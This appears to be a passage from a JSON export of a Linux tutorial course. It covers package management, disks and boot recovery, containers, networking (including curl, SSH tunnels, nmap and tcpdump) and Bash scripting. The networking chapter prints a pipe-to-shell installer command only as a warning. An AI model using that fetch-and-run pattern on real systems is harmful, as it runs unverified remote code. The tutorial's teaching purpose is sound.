blame systemctl --failed Do not guess at boot repairs on a machine you cannot access physically. Know how to use a recovery shell or a live environment first. Beyond apt: other package ecosystems Debian and Ubuntu are common in labs, but you will meet other systems. The concepts stay the same: repositories, metadata, dependencies, signatures and a local database. System Install Search Remove List files Debian, Ubuntu apt install pkg apt search pkg apt remove pkg dpkg -L pkg Fedora, RHEL dnf install pkg dnf search pkg dnf remove pkg rpm -ql pkg Arch pacman -S pkg pacman -Ss pkg pacman -R pkg pacman -Ql pkg openSUSE zypper install pkg zypper search pkg zypper remove pkg rpm -ql pkg Alpine apk add pkg apk search pkg apk del pkg apk info -L pkg Refresh, upgrade and clean with the native tools: sudo dnf check-update sudo dnf upgrade sudo dnf autoremove sudo pacman -Syu sudo pacman -Rns package sudo zypper refresh sudo zypper update sudo zypper remove package dnf upgrade and pacman -Syu refresh metadata and install updates in one step. apt separates update (refresh metadata) from upgrade (install). Read the transaction summary before confirming. A partial upgrade on a rolling distribution can leave the system in a mixed state. Universal package formats sit beside the distribution manager: snap list snap find firefox sudo snap install firefox flatpak list flatpak search org.example.App flatpak install flathub org.example.App Snap and Flatpak packages bundle their dependencies and run with their own sandbox rules. They solve some compatibility problems and create new ones: larger downloads, duplicate libraries, different update paths and separate permission models. AppImage is a single executable file. It does not install system-wide. Treat an AppImage like any other downloaded binary: verify its source and checksum before running it. Language-specific package managers such as pip, npm, gem and cargo are useful for development. They are not a replacement for system packages when the software provides a system service. Mixing them can create duplicate versions and files that the system package manager does not track. Build software from source Sometimes a package is not available, or you need a specific version. Building from source gives control but shifts responsibility for updates, dependencies and security patches to you. A typical autotools build looks like this: tar -xJf project-1.2.3.tar.xz cd project-1.2.3 ./configure --prefix=/usr/local make sudo make install Read the project's build instructions first. ./configure --help lists options. make -j\"$(nproc)\" builds in parallel. make install copies files into the prefix. A safer staging step is: make DESTDIR=\"$PWD/package\" install find package -type f | head This collects the installed files in a temporary tree so you can inspect them before copying to the live system. Packaging tools such as checkinstall can turn the result into a distribution package, but they are not a substitute for a proper package recipe. Record the version, source URL, checksum and build options. Future updates depend on that record. Checksums and signatures A checksum detects accidental corruption and simple tampering. A signature verifies who published a file, assuming you trust the public key. sha256sum project-1.2.3.tar.xz sha256sum -c project-1.2.3.tar.xz.sha256 gpg --verify project-1.2.3.tar.xz.sig project-1.2.3.tar.xz If the checksum does not match, stop. Do not try to fix the file. Download it again from the official source and compare the published checksum through a second channel. GPG key handling matters: gpg --list-keys gpg --import publisher.asc gpg --fingerprint publisher@example.org Check the fingerprint against an independent source. A key downloaded from the same page as the file does not prove much if that page was compromised. Key trust is a social and operational problem, not only a command-line one. Debian and Ubuntu package managers verify repository signatures automatically. Do not disable signature checks to make an installation proceed. Fix the repository configuration or choose a different source. Partitions, filesystems and LVM A disk can be divided into partitions. A partition can hold a filesystem, swap, LVM physical volume or another structure. lsblk sudo fdisk -l sudo parted -l sudo blkid lsblk shows the device tree. fdisk -l and parted -l list partition tables. blkid shows UUIDs, labels and filesystem types. Create a filesystem only on the correct device: sudo mkfs.ext4 /dev/sdb1 sudo mkfs.xfs /dev/sdc1 This destroys existing data. Confirm the device path twice. Disk names can change when hardware is added or removed. UUIDs are more stable in /etc/fstab. Walk through a new disk The following sequence is an example for a new, empty disk. Confirm the device name with lsblk before every step. On a lab machine, /dev/sdb might be the disk you intend to use, or it might be a USB drive with data you need. lsblk sudo fdisk -l /dev/sdb sudo fdisk /dev/sdb Inside fdisk, the usual sequence for one Linux partition on a DOS label is: n create a new partition p choose a primary partition 1 partition number Enter accept the default first sector Enter accept the default last sector w write the table and exit q quits without writing. d deletes a partition. p prints the table. Read the prompts instead of typing from memory. After writing: sudo partprobe /dev/sdb lsblk -f /dev/sdb sudo mkfs.ext4 /dev/sdb1 sudo mkdir -p /data sudo mount /dev/sdb1 /data df -h /data Make the mount persistent with the filesystem UUID, not the device name: sudo blkid /dev/sdb1 sudoedit /etc/fstab Add a line such as: UUID=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx /data ext4 defaults,nofail 0 2 Then test: sudo umount /data sudo mount -a findmnt /data nofail lets the system boot if the disk is missing. That is useful for removable data disks and dangerous for a disk that a required service needs. Use defaults only after you understand the mount options you need. For GPT disks, use parted or gdisk; the concepts are the same. LVM adds a layer between disks and filesystems. Do not run this sequence on the same disk you just partitioned unless you intend to replace that layout. Use a separate empty disk or an unused partition. Inspect existing objects before you create new ones: sudo pvs sudo vgs sudo lvs Only run pvcreate on a disk or partition you intend to dedicate to LVM. It overwrites existing filesystem signatures: sudo pvcreate /dev/sdb sudo vgcreate vg0 /dev/sdb sudo lvcreate -L 10G -n data vg0 sudo mkfs.ext4 /dev/vg0/data sudo mkdir -p /data sudo mount /dev/vg0/data /data pvs, vgs and lvs show physical volumes, volume groups and logical volumes. Extending a logical volume does not automatically grow the filesystem. Run the filesystem-specific resize command after the volume change: sudo lvextend -L +5G /dev/vg0/data sudo resize2fs /dev/vg0/data Check and repair a filesystem only when it is unmounted, or at boot before it is mounted: sudo umount /dev/sdb1 sudo fsck -f /dev/sdb1 Running fsck on a mounted read-write filesystem can cause damage. Know the filesystem type and read the tool's manual page. Disk health and I/O errors smartctl reads drive health data when the drive supports it. sudo smartctl -a /dev/sda sudo smartctl -t short /dev/sda sudo smartctl -l selftest /dev/sda Look for reallocated sectors, pending sectors, uncorrectable errors and a failing self-test. A single old error may be historical. A growing count is a warning. Kernel messages record I/O and hardware problems: dmesg -T | tail -n 50 dmesg -T --level=err,warn journalctl -k -p err --no-pager -T prints human-readable timestamps when the kernel log supports them. On some systems, dmesg access is restricted. Use journalctl -k as an alternative. Do not run destructive surface tests on a disk that holds data you need. Back up first. A failing drive can fail completely during a stress test. Bootloader, initramfs and recovery The boot process depends on a bootloader, a kernel, an initramfs and the init system. Recovery means knowing how to interrupt and repair each stage. GRUB is the most common bootloader on x86 systems. cat /etc/default/grub sudo update-grub sudo grub2-mkconfig -o /boot/grub2/grub.cfg The first command is used on Debian and Ubuntu. The second is common on Red Hat family systems. The configuration path varies. Check the distribution documentation before regenerating a bootloader configuration. The initramfs contains the early userspace needed to mount the real root filesystem. Rebuild it after changing storage drivers, RAID, LVM or encryption configuration. sudo update-initramfs -u sudo dracut -f Use the command that matches your distribution. A missing driver in the initramfs can make the system unbootable even when the kernel and root filesystem are fine. Recovery options: Boot into a rescue or emergency target. Add systemd.unit=rescue.target to the kernel command line. Boot a live USB and mount the installed system. Use chroot to repair the installed system from the live environment. A typical chroot repair sequence: lsblk sudo mount /dev/sda2 /mnt sudo mount /dev/sda1 /mnt/boot sudo mount --bind /dev /mnt/dev sudo mount --bind /proc /mnt/proc sudo mount --bind /sys /mnt/sys sudo chroot /mnt Inside the chroot, you can reinstall the bootloader, rebuild the initramfs or repair configuration. Exit with exit, then unmount in reverse order. Do not run a chroot repair sequence from memory on a production machine. Read the distribution's recovery guide and confirm every device path. Containers and isolated services Containers package an application with its user-space dependencies and run it in an isolated view of the host. They share the host kernel, so they are lighter than virtual machines and not a complete security boundary. Docker and Podman are common runtimes. Their basic commands are similar. docker ps docker images docker run --rm -it alpine sh docker logs container_name docker exec -it container_name sh docker inspect container_name docker stop container_name Podman uses the same command shape: podman ps podman run --rm -it alpine sh podman logs container_name --rm removes the container when it exits. -it attaches an interactive terminal. docker logs reads the container's standard output. docker exec starts a process inside a running container. Persistent data should live in a volume or a bind mount, not in the container's writable layer. docker volume create appdata docker run -d --name app -v appdata:/var/lib/app image:tag docker run --rm -v \"$PWD/data:/data:ro\" alpine ls /data The :ro suffix mounts the host directory read-only. A bind mount gives the container direct access to a host path. Treat that access as a privilege decision. Inspect the container's isolation: docker inspect --format '{{.Config.User}}' container_name docker inspect --format '{{json .Mounts}}' container_name docker top container_name Run as a non-root user inside the image when possible. Do not mount the Docker socket into a container unless you intend to give it control over the host's container runtime. A container with the host Docker socket is effectively root on the host. Docker Compose describes multi-container services in YAML: services: web: image: nginx:stable ports: - \"8080:80\" volumes: - ./site:/usr/share/nginx/html:ro Use docker compose up -d to start and docker compose down to stop. Read the compose file before running it. Port mappings, volumes and environment variables define the container's exposure. Lab: inspect a safe system lsblk -f df -h df -i findmnt / cat /etc/fstab systemctl get-default systemctl --failed journalctl -b -p err --no-pager | head -n 20 Then answer: Which filesystem is mounted at /? How much space and how many inodes are free? Which device provides the root filesystem? Are any units failed? What is the default systemd target? Common mistakes Running apt upgrade without reading the proposed changes. Adding repositories and keys from untrusted sources. Deleting files to free space without finding the owner. Editing fstab without testing with mount -a. Rebooting a broken system before collecting logs. Checkpoint You should now be able to: Install, query and remove packages on Debian or Ubuntu. Explain the difference between a package and a repository. Inspect disks, filesystems, inodes and mounts. Read fstab and test a mount change safely. Describe the Linux boot sequence and find boot errors. Next you will connect the system to a network and inspect it from the command line."},{"kind":"foundation","number":8,"order":108,"href":"foundations/08-networking-essentials.html","slug":"08-networking-essentials","page":"08-networking-essentials.html","title":"Networking from the Command Line","short":"Networking","summary":"Read interfaces, routes, DNS, ports and SSH, then test connectivity from the shell.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":19,"words":2240,"sections":18,"codeBlocks":37,"headings":[{"id":"interfaces-and-addresses","text":"Interfaces and addresses","level":2},{"id":"routes","text":"Routes","level":2},{"id":"name-resolution","text":"Name resolution","level":2},{"id":"ports-and-sockets","text":"Ports and sockets","level":2},{"id":"test-connectivity","text":"Test connectivity","level":2},{"id":"download-files-with-curl-and-wget","text":"Download files with curl and wget","level":2},{"id":"ssh-essentials","text":"SSH essentials","level":2},{"id":"firewalls-in-one-minute","text":"Firewalls in one minute","level":2},{"id":"addressing-prefixes-and-subnetting","text":"Addressing, prefixes and subnetting","level":2},{"id":"dhcp-and-persistent-network-configuration","text":"DHCP and persistent network configuration","level":2},{"id":"packet-capture-and-port-inspection","text":"Packet capture and port inspection","level":2},{"id":"firewalls-beyond-ufw","text":"Firewalls beyond ufw","level":2},{"id":"ssh-tunnels-and-hardening","text":"SSH tunnels and hardening","level":2},{"id":"dns-and-network-performance","text":"DNS and network performance","level":2},{"id":"network-command-quick-reference","text":"Network command quick reference","level":2},{"id":"lab-map-your-own-host","text":"Lab: map your own host","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"Linux treats networking as a set of interfaces, addresses, routes, sockets and name resolution rules. You do not need to memorize every protocol to operate a system, but you do need to answer basic questions: what address is this host using, where does traffic go, which process is listening, and can I reach the other side? Interfaces and addresses ip link ip addr ip -brief addr An interface is a network device. lo is the loopback interface, usually 127.0.0.1 and ::1. eth0, ens18 or enp0s3 are common wired interface names. Wi-Fi interfaces often start with wl. An address belongs to an interface. A host can have multiple IPv4 and IPv6 addresses. ip addr shows the address, prefix length and state. ip addr show dev eth0 ip -6 addr Bring an interface up or down only when you understand the impact: sudo ip link set dev eth0 up sudo ip link set dev eth0 down On a remote system, bringing down the interface you are connected through will end your session. Routes A route tells the kernel where to send a packet. ip route ip -6 route ip route get 1.1.1.1 The default route, marked default, is the path to the internet or another network. A more specific route wins over a less specific one. ip route get shows the route the kernel would choose for a destination. ip route add 10.20.0.0/16 via 192.168.1.1 sudo ip route del 10.20.0.0/16 Routes added with ip are temporary unless you configure them persistently in the network manager. Test carefully before changing the default route. Name resolution DNS turns names into addresses. Linux uses the resolver configuration in /etc/resolv.conf, often managed by systemd-resolved or NetworkManager. cat /etc/resolv.conf resolvectl status getent hosts example.com dig example.com dig +short example.com getent hosts uses the same name service switch path as normal applications. dig queries DNS directly and shows the full response. If ping example.com fails but ping 1.1.1.1 works, name resolution is the first suspect. The hosts file can override DNS: cat /etc/hosts Be careful when editing it. A stale entry can make a service unreachable even when DNS is healthy. Ports and sockets A socket is an endpoint for communication. A listening socket waits for incoming connections. ss -tulpn ss -tan ss -tulpn | grep ':22' Option Meaning -t TCP -u UDP -l Listening sockets -p Show the process, when permitted -n Do not resolve names -a All sockets The local address 0.0.0.0:22 means the service listens on every IPv4 interface. 127.0.0.1:5432 means it listens only on loopback. That difference matters for exposure. lsof -i and fuser can also identify processes using a port, but ss is usually faster and more direct. Test connectivity ping -c 4 1.1.1.1 ping -c 4 example.com traceroute example.com curl -I https://example.com curl -v https://example.com ping tests ICMP reachability, not whether a particular service is available. Many networks block ICMP. traceroute shows the path, subject to filtering. curl -I fetches response headers and is a quick way to test an HTTP endpoint. For a TCP port without a dedicated client, use a short timeout: timeout 3 bash -c '\u003c/dev/tcp/example.com/443' && echo open This is a shell feature, not a replacement for a proper network scanner. Use it only on systems you are authorized to test. Download files with curl and wget curl and wget both fetch content over HTTP and HTTPS. curl is a general request tool. wget is optimized for downloading files and resuming interrupted transfers. curl -fLO https://example.com/releases/tool-1.2.3.tar.gz curl -fL -o tool.tar.gz https://example.com/releases/tool-1.2.3.tar.gz curl -C - -O https://example.com/releases/tool-1.2.3.tar.gz curl -I https://example.com wget https://example.com/releases/tool-1.2.3.tar.gz wget -c https://example.com/releases/tool-1.2.3.tar.gz wget -O tool.tar.gz 'https://example.com/download?id=42' wget --spider https://example.com Option Meaning -f Fail on HTTP errors instead of saving an error page -L Follow redirects -O Use the remote filename in curl; choose a filename in wget -o Write to a chosen filename in curl -C - Resume a partial download in curl -c Continue a partial download in wget --spider Check that a URL exists without saving it in wget After a download, verify the checksum or signature from a source you trust: sha256sum tool-1.2.3.tar.gz gpg --verify tool-1.2.3.tar.gz.sig tool-1.2.3.tar.gz HTTPS protects the transfer, not the publisher. A valid TLS connection to a compromised site still delivers malicious content. Never pipe a download directly into a shell: curl -fsSL https://example.com/install.sh | sh Download the script, read it, verify it, then run it. If credentials are required, use a header or an authenticated configuration file with restrictive permissions. Do not put secrets in a URL that will appear in shell history and logs. SSH essentials SSH provides encrypted remote shells and file transfer. ssh user@host ssh -p 2222 user@host ssh -i ~/.ssh/lab_key user@host Generate a key pair: ssh-keygen -t ed25519 -a 100 -C 'lab key' The private key stays on your machine. The public key goes to the remote account's ~/.ssh/authorized_keys. ssh-copy-id automates the first copy: ssh-copy-id -i ~/.ssh/lab_key.pub user@host A per-host configuration in ~/.ssh/config keeps options readable: Host lab HostName 192.0.2.10 User alice Port 2222 IdentityFile ~/.ssh/lab_key Then ssh lab uses those settings. File transfer: scp report.txt lab:/tmp/ scp lab:/var/log/syslog ./syslog-copy For interactive file transfer, sftp lab works over the same SSH connection. Firewalls in one minute A firewall decides which traffic is allowed. On Ubuntu, ufw is a common front end: sudo ufw status verbose sudo ufw allow 22/tcp sudo ufw enable On systems using nftables directly: sudo nft list ruleset Before enabling a firewall on a remote host, allow your SSH port. Otherwise you can lock yourself out. A firewall rule is only one layer; services should also bind to the right interface and use authentication. Addressing, prefixes and subnetting An IPv4 address is 32 bits, usually written as four decimal octets. A prefix length says how many leading bits identify the network. 192.168.1.10/24 /24 means the first 24 bits are the network and the last 8 bits identify the host. The network address is 192.168.1.0, the usable range is usually 192.168.1.1 to 192.168.1.254, and the broadcast address is 192.168.1.255. Private IPv4 ranges are not routed on the public internet: Range Common use 10.0.0.0/8 Large private networks 172.16.0.0/12 Private networks 192.168.0.0/16 Home and small office networks 127.0.0.0/8 Loopback 169.254.0.0/16 Link-local, often a sign of failed DHCP IPv6 addresses are 128 bits and written in hexadecimal with colons. :: compresses one run of zero groups. ::1 is loopback. Link-local addresses begin with fe80:: and are scoped to an interface. Useful address tools: ipcalc 192.168.1.10/24 ip -brief addr ip -6 addr ip route get 8.8.8.8 ipcalc may need to be installed. It shows the network, broadcast, host range and mask. ip route get shows which interface and source address the kernel would use for a destination. A host can have multiple addresses on one interface. That is normal for IPv4 and IPv6, for aliases and for containers. Do not assume one interface equals one address. DHCP and persistent network configuration DHCP assigns addresses, routes and DNS settings automatically. A DHCP client usually runs at boot and renews the lease periodically. ip -brief addr networkctl status resolvectl status A 169.254.x.x address often means the DHCP server did not respond. Check the link, the switch, the DHCP service and the lease logs. Persistent configuration depends on the distribution and the network manager: Stack Typical configuration NetworkManager nmcli, nmtui, /etc/NetworkManager/ systemd-networkd /etc/systemd/network/*.network netplan /etc/netplan/*.yaml, often with NetworkManager or networkd as a backend ifupdown /etc/network/interfaces Red Hat family /etc/sysconfig/network-scripts/ or NetworkManager keyfiles Inspect before editing: nmcli device status nmcli connection show networkctl list cat /etc/netplan/*.yaml Netplan applies YAML configuration: sudo netplan try sudo netplan apply netplan try applies the change with a rollback timer. Use it on remote systems so a mistake does not immediately lock you out. Do not edit a file owned by a network manager and expect the manager to ignore it. Changes may be overwritten at the next boot. Use the manager's own tooling. Packet capture and port inspection tcpdump captures packets. It is the command-line workhorse for checking what is actually on the wire. sudo tcpdump -i any -nn sudo tcpdump -i eth0 -nn port 22 sudo tcpdump -i eth0 -nn host 192.0.2.10 sudo tcpdump -i eth0 -nn -c 20 -w capture.pcap sudo tcpdump -r capture.pcap -nn Filter Meaning host 192.0.2.10 Traffic to or from one host src host 192.0.2.10 Traffic from one host dst port 443 Traffic to one port tcp TCP traffic only udp UDP traffic only icmp ICMP traffic only port 53 DNS traffic, usually net 10.0.0.0/8 Traffic to or from a network -nn disables name and port resolution, which keeps output fast and unambiguous. -c limits the packet count. -w writes a pcap file. -r reads one. tshark provides protocol decoding and display filters: tshark -r capture.pcap tshark -r capture.pcap -Y 'http.request' tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport nmap is a network scanner. Use it only on systems you own or have explicit written permission to test. nmap -sn 192.0.2.0/24 nmap -sT -p 22,80,443 192.0.2.10 nmap -sV -p 22,80,443 192.0.2.10 -sn is a host discovery scan. -sT uses a full TCP connection. -sV tries to identify service versions. Scans generate traffic and logs. Authorization comes before curiosity. Firewalls beyond ufw ufw is a friendly front end. Underneath, Linux uses netfilter. On modern systems, nftables is the default framework. Some systems still use iptables. sudo ufw status numbered sudo ufw allow from 192.0.2.0/24 to any port 22 proto tcp sudo ufw delete 2 sudo nft list ruleset sudo iptables -L -n -v ufw status numbered shows rule numbers for deletion. nft list ruleset prints the current nftables rules. iptables -L -n -v prints the legacy or compatibility view, depending on the system. A firewall policy needs a default stance: Drop or reject inbound traffic that is not explicitly allowed. Allow established and related connections. Allow only the services that should be reachable. Restrict management access by source network when possible. Log denied traffic sparingly, or the logs become noise. Before enabling a firewall on a remote host, allow your SSH source and port. Test from a second session. Keep a console or recovery path open. SSH tunnels and hardening SSH can forward ports and create tunnels. ssh -L 8080:127.0.0.1:80 user@host ssh -R 9000:127.0.0.1:3000 user@host ssh -D 1080 user@host -L forwards a local port to a remote destination. -R forwards a remote port to a local destination. -D starts a SOCKS proxy. These features are powerful and should be used within policy. A per-host configuration keeps commands short: Host lab HostName 192.0.2.10 User alice Port 2222 IdentityFile ~/.ssh/lab_key ServerAliveInterval 30 Then: ssh lab scp report.txt lab:/tmp/ Server hardening starts with /etc/ssh/sshd_config and drop-in files under /etc/ssh/sshd_config.d/. PermitRootLogin no PasswordAuthentication no PubkeyAuthentication yes AllowUsers alice MaxAuthTries 3 Validate before restarting: sudo sshd -t sudo systemctl reload ssh Keep your current session open while testing a new SSH configuration. If the new configuration rejects you, the old session is your way back in. DNS and network performance DNS problems often look like general network failures. Test name resolution separately from connectivity. getent hosts example.com dig example.com dig +short example.com dig @1.1.1.1 example.com resolvectl query example.com getent hosts uses the system resolver path. dig queries DNS directly. dig @server tests a specific resolver. resolvectl query uses systemd-resolved when it is active. If an IP address works but a hostname does not, check /etc/resolv.conf, the resolver manager, /etc/hosts and the DNS server. If both fail, check the interface, route and firewall. Network statistics: ss -s ip -s link ip -s link show dev eth0 mtr example.com ss -s summarizes sockets. ip -s link shows interface counters, including errors and drops. mtr combines traceroute and ping over time. A few dropped packets may be normal. A growing error count is not. Network command quick reference Task Command Show addresses ip -brief addr Show routes ip route Query DNS dig +short example.com, getent hosts example.com List listening sockets ss -tulpn Test reachability ping -c 4 example.com Test an HTTP endpoint curl -I https://example.com Trace a path traceroute example.com Capture traffic sudo tcpdump -i any -nn Check NetworkManager nmcli device status Legacy interface view ifconfig, replaced by ip Legacy socket view netstat -tulnp, replaced by ss Legacy DNS query nslookup example.com, replaced by dig ifconfig, netstat and nslookup still appear in older guides and may be installed for compatibility. Prefer ip, ss and dig or getent. If a legacy command is missing, install the package that provides it only when you have a reason. Do not add tools just to follow an old tutorial. Lab: map your own host ip -brief addr ip route cat /etc/resolv.conf getent hosts example.com ss -tulpn ping -c 2 127.0.0.1 curl -I https://example.com Then answer: Which interface has the default route? Which DNS resolver is configured? Which TCP ports are listening on all interfaces? Which services are listening only on loopback? Does example.com resolve to an IPv4 address, an IPv6 address or both? Common mistakes Confusing a listening port with a reachable service. Editing DNS settings without checking which resolver manager owns the file. Enabling a firewall before allowing SSH. Using ping as proof that an application is healthy. Copying a private SSH key to a remote host. Checkpoint You should now be able to: Read interface, address and route information. Diagnose a DNS problem separately from a connectivity problem. Identify listening sockets and their processes. Test HTTP and SSH connectivity. Make a basic firewall change without locking yourself out. Next you will turn these commands into reusable Bash scripts."},{"kind":"foundation","number":9,"order":109,"href":"foundations/09-bash-scripting-foundations.html","slug":"09-bash-scripting-foundations","page":"09-bash-scripting-foundations.html","title":"Bash Scripting Foundations","short":"Bash scripts","summary":"Write readable scripts with quoting, tests, loops, functions and error handling.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":18,"words":2041,"sections":20,"codeBlocks":36,"headings":[{"id":"start-with-a-safe-template","text":"Start with a safe template","level":2},{"id":"variables-and-quoting","text":"Variables and quoting","level":2},{"id":"command-substitution","text":"Command substitution","level":2},{"id":"arguments","text":"Arguments","level":2},{"id":"tests-and-conditionals","text":"Tests and conditionals","level":2},{"id":"loops","text":"Loops","level":2},{"id":"functions","text":"Functions","level":2},{"id":"error-handling","text":"Error handling","level":2},{"id":"a-practical-script","text":"A practical script","level":2},{"id":"parameter-expansion","text":"Parameter expansion","level":2},{"id":"arrays","text":"Arrays","level":2},{"id":"case-statements-and-menus","text":"Case statements and menus","level":2},{"id":"here-documents-and-generated-configuration","text":"Here documents and generated configuration","level":2},{"id":"process-substitution-and-file-descriptors","text":"Process substitution and file descriptors","level":2},{"id":"parse-options-with-getopts","text":"Parse options with getopts","level":2},{"id":"debugging-and-testing","text":"Debugging and testing","level":2},{"id":"portability-and-scheduling","text":"Portability and scheduling","level":2},{"id":"lab-write-a-system-report","text":"Lab: write a system report","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"A shell script is a text file that the shell reads and executes. It is the fastest way to automate a sequence of commands, and it is already installed on almost every Linux system. This part teaches the subset you need for reliable, readable scripts. Start with a safe template #!/usr/bin/env bash set -euo pipefail main() { printf 'Starting %s\\n' \"$0\" } main \"$@\" The first line is the shebang. It tells the kernel which interpreter to use. set -euo pipefail makes the script fail on unhandled errors, unset variables and failed pipeline stages. It is not a complete safety system, but it catches many mistakes early. Make the script executable and run it: chmod +x script.sh ./script.sh Use shellcheck script.sh when available. It catches quoting bugs, unused variables and many portability problems. Variables and quoting name=\"Linux Foundations\" count=10 printf 'name=%s count=%d\\n' \"$name\" \"$count\" Assign without spaces around =. Read with $name or ${name}. Use braces when the variable is followed by text: file=\"report\" printf '%s\\n' \"${file}.txt\" Quote expansions in most cases: printf '%s\\n' \"$name\" Unquoted values undergo word splitting and glob expansion. That can turn one argument into several or expand * into filenames. Use arrays when you need a list: files=(\"one.txt\" \"two words.txt\") for file in \"${files[@]}\"; do printf 'file: %s\\n' \"$file\" done Command substitution today=$(date +%F) kernel=$(uname -r) printf 'date=%s kernel=%s\\n' \"$today\" \"$kernel\" Capture output only when you need it. If you just want to run a command and show output, run it directly. Avoid backticks; $(...) nests cleanly and is easier to read. Arguments Variable Meaning $0 Script name $1, $2 Positional arguments $# Number of arguments $@ All arguments as separate words $* All arguments as one word in some contexts $? Exit status of the last command if [ \"$#\" -lt 1 ]; then printf 'usage: %s \u003cpath>\\n' \"$0\" >&2 exit 2 fi target=$1 printf 'target=%s\\n' \"$target\" Use \"$@\" when forwarding arguments. It preserves each argument as a separate word. Tests and conditionals if [ -f /etc/passwd ]; then printf 'file exists\\n' fi if [ ! -d /tmp/lab ]; then mkdir -p /tmp/lab fi if [ \"$USER\" = \"root\" ]; then printf 'running as root\\n' else printf 'running as %s\\n' \"$USER\" fi Common tests: Test True when -e path Path exists -f path Regular file -d path Directory -r path Readable -w path Writable -x path Executable -z string String is empty -n string String is not empty a = b Strings are equal a != b Strings differ n -eq m Integers are equal n -lt m Integer is less than Bash also supports [[ ... ]], which handles pattern matching and avoids some word-splitting problems: if [[ \"$file\" == *.log ]]; then printf 'log file\\n' fi Use (( ... )) for arithmetic: count=0 ((count++)) printf 'count=%d\\n' \"$count\" Loops for file in /etc/*.conf; do printf '%s\\n' \"$file\" done count=1 while [ \"$count\" -le 3 ]; do printf 'count=%d\\n' \"$count\" ((count++)) done while IFS= read -r line; do printf 'line: %s\\n' \"$line\" done \u003c /etc/hostname IFS= read -r preserves whitespace and backslashes. Use it for line-oriented input. For arbitrary filenames, use null-delimited input as shown in the files chapter. Functions usage() { printf 'usage: %s \u003cdirectory>\\n' \"$0\" >&2 } check_dir() { local dir=$1 if [ ! -d \"$dir\" ]; then printf 'not a directory: %s\\n' \"$dir\" >&2 return 1 fi } check_dir /tmp || exit 1 Use local for function variables. Return a status with return 0 for success or a non-zero value for failure. Do not use exit inside a function unless you really want to end the whole script. Error handling set -e is useful but subtle. A command in an if, while or && chain is allowed to fail without exiting. If you need to clean up, use trap: #!/usr/bin/env bash set -euo pipefail tmpdir=$(mktemp -d) cleanup() { rm -rf \"$tmpdir\" } trap cleanup EXIT printf 'working in %s\\n' \"$tmpdir\" The trap runs when the script exits, including on an error. Keep cleanup idempotent so it is safe to run more than once. For expected failures, handle them explicitly: if ! grep -q '^root:' /etc/passwd; then printf 'root entry missing\\n' >&2 exit 1 fi A practical script #!/usr/bin/env bash set -euo pipefail usage() { printf 'usage: %s \u003clogfile>\\n' \"$0\" >&2 exit 2 } [ \"$#\" -eq 1 ] || usage logfile=$1 if [ ! -r \"$logfile\" ]; then printf 'cannot read: %s\\n' \"$logfile\" >&2 exit 1 fi printf 'lines: %s\\n' \"$(wc -l \u003c \"$logfile\")\" printf 'errors: %s\\n' \"$(grep -ci 'error' \"$logfile\" || true)\" printf 'last modified: %s\\n' \"$(stat -c '%y' \"$logfile\")\" The || true on grep keeps a no-match result from failing the script under set -e. Use that pattern only when no match is a valid outcome. Parameter expansion Bash can transform a variable while expanding it. These forms avoid extra commands and work well in scripts. Form Result ${name:-default} Use default if name is unset or empty ${name:=default} Assign default if name is unset or empty ${name:?message} Print message and exit if name is unset or empty ${name:+alternate} Use alternate if name is set and non-empty ${#name} Length of the value ${name#prefix} Remove the shortest matching prefix ${name##prefix} Remove the longest matching prefix ${name%suffix} Remove the shortest matching suffix ${name%%suffix} Remove the longest matching suffix ${name/old/new} Replace the first match ${name//old/new} Replace all matches Examples: set -u target=${1:?usage: script.sh \u003cpath>} backup=${BACKUP_DIR:-$HOME/backups} name='report-2026-01.txt' printf 'name=%s\\n' \"$name\" printf 'base=%s\\n' \"${name%.txt}\" printf 'stem=%s\\n' \"${name%-*}\" printf 'length=%d\\n' \"${#name}\" ${1:?message} is a compact way to require an argument. The script exits with an error if the value is missing. ${name%.txt} removes the suffix. ${name%-*} removes the shortest match from the end. Use set -u while developing. It turns an unset variable into an error instead of an empty string. That catches typos, but it can also break scripts that intentionally test for an unset value. Arrays An array holds multiple values. Use it when a list has spaces or when you need to preserve each item as one argument. files=(\"one.txt\" \"two words.txt\" \"three.txt\") printf 'count=%d\\n' \"${#files[@]}\" printf '%s\\n' \"${files[@]}\" for file in \"${files[@]}\"; do printf 'file: %s\\n' \"$file\" done ${files[@]} expands to separate words. \"${files[@]}\" preserves each element as one argument. ${#files[@]} is the number of elements. ${!files[@]} lists the indexes. Associative arrays use string keys: declare -A sizes sizes[small]=10 sizes[large]=100 printf 'large=%s\\n' \"${sizes[large]}\" for key in \"${!sizes[@]}\"; do printf '%s=%s\\n' \"$key\" \"${sizes[$key]}\" done Associative arrays require Bash 4 or newer. If a script must run under /bin/sh, do not use them. Read a file into an array safely: mapfile -t lines \u003c file.txt printf '%s\\n' \"${lines[@]}\" mapfile preserves lines and avoids word splitting. Use readarray as an alias in Bash. Case statements and menus A case statement is clearer than a long if chain when matching a small set of values. action=${1:-status} case $action in start) printf 'starting\\n' ;; stop) printf 'stopping\\n' ;; status|check) printf 'checking\\n' ;; *) printf 'usage: %s {start|stop|status}\\n' \"$0\" >&2 exit 2 ;; esac The | separates alternatives. The * pattern is the default. Quote the variable in the case word only when you want to prevent pattern interpretation. In a case pattern, unquoted variables are treated as patterns, which is usually not what you want. A simple menu uses select: PS3='Choose an action: ' select action in status start stop quit; do case $action in quit) break ;; *) printf 'selected: %s\\n' \"$action\" ;; esac done select is interactive and not suitable for unattended scripts. It is useful for small lab tools. Here documents and generated configuration A here document feeds a block of text to a command. cat > config.ini \u003c\u003c'EOF' [server] host = 127.0.0.1 port = 8080 EOF The quoted delimiter prevents variable expansion. Remove the quotes when you want expansion: host=127.0.0.1 port=8080 cat > config.ini \u003c\u003cEOF [server] host = $host port = $port EOF Be careful when generating configuration from untrusted values. A value containing a newline can inject an extra directive. Validate input or use a tool that escapes values correctly. A here string passes one line: grep -q root \u003c\u003c\u003c 'root:x:0:0:root:/root:/bin/bash' Process substitution and file descriptors Process substitution presents a command's output as a file-like path. diff -u \u003c(sort a.txt) \u003c(sort b.txt) while IFS= read -r line; do printf 'line: %s\\n' \"$line\" done \u003c \u003c(grep -v '^#' /etc/services) The second example uses input redirection from a process substitution. It keeps the loop in the current shell. A pipeline would run the loop in a subshell in some shells, so variables set inside would be lost. 